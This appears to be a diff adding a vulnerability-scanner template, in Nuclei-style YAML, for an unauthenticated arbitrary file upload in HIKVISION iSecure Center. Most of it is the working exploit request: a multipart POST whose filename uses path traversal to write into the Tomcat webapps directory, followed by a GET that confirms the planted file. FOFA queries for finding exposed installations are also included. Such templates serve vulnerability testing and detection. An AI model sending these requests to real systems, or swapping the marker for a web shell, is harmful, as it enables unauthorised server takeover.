@@ -1,0 +1,63 @@
+id: hikvision_isecure_center_unauth_upload_files
+
+info:
+  name: hikvision_isecure_center_unauth_upload_files
+  author: rootklt
+  severity: critical
+  description: |
+    HIKVISION iSecure Center综合安防管理平台 /center/api/files 接口存在任意文件上传漏洞，未经授权攻击者通过漏洞上传任意文件，最终可以获取服务器权限。
+  reference:
+    - https://github.com/ibaiw/2023Hvv/blob/main/%E6%B5%B7%E5%BA%B7%E5%8D%AB%E8%A7%86%E5%89%8D%E5%8F%B0%E4%B8%8A%E4%BC%A0.md
+  metadata:
+    fofa-query: 
+      - app="HIKVISION-iSecure-Center"
+      - icon_hash="-808437027"
+    hunter-query: 
+    verified: true
+  tags: 2023,hikvision,upload,rce
+
+variables:
+  filename: "{{rand_text_alpha(10)}}"
+  flag: {{randstr}}
+
+requests:
+  - raw:
+      - |
+        POST /center/api/files;.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 Chrome/115.0.0.0
+        Accept-Encoding: gzip, deflate
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Connection: close
+        Cache-Control: max-age=0
+        Sec-Ch-Ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "Windows10"
+        Upgrade-Insecure-Requests: 1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary039Jk2fE73KKrZ3A
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Language: zh-CN,zh;q=0.9
+
+        ------WebKitFormBoundary039Jk2fE73KKrZ3A
+        Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{filename}}.txt"
+        Content-Type: application/octet-stream
+
+        {{flag}}
+        ------WebKitFormBoundary039Jk2fE73KKrZ3A--
+
+      - |
+        GET /clusterMgr/{{filename}}.txt;.js HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: 
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{flag}}"
